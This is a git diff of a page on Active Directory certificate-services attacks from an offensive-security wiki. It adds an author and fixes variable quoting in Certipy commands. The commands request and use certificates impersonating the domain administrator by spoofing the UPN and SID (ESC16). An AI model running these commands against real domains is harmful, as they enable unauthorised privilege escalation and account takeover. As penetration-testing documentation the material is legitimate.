@@ -1,5 +1,5 @@
 ---
-authors: BlWasp, ShutdownRepo, sckdev
+authors: BlWasp, ShutdownRepo, sckdev, gadoufit29
 category: ad
 ---
 
@@ -1148,7 +1148,7 @@ certipy shadow \
 certipy req \
     -u "victim@$DOMAIN" -hashes "$NT_HASH" \
     -ca DOMAIN-DC-CA -template User \
-    -upn administrator@$DOMAIN -dc-ip "$DC_IP"
+    -upn "administrator@$DOMAIN" -dc-ip "$DC_IP"
 ```
 
 **Step 4: Revert the victim account's UPN**
@@ -1163,7 +1163,7 @@ certipy account \
 ```bash
 certipy auth \
     -dc-ip "$DC_IP" -pfx 'administrator.pfx' \
-    -username 'administrator' -domain '$DOMAIN'
+    -username 'administrator' -domain "$DOMAIN"
 ```
 
 The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
@@ -1220,7 +1220,7 @@ To conduct this scenario, the following additionnal prerequisites must be met:
 From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) can be used to request a certificate with a specific UPN and SID. As the whole CA is vulnerable to ESC16, any certificate template can be used to enroll at, we can for example use the `User` template.
 
 ```bash
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$TARGET" -ca "$CA" -template "User" -upn "administrator@$DOMAIN" -sid 'ADMIN_SID'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$TARGET" -ca "$CA" -template "User" -upn "administrator@$DOMAIN" -sid "$ADMIN_SID"
 ```
 
 The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
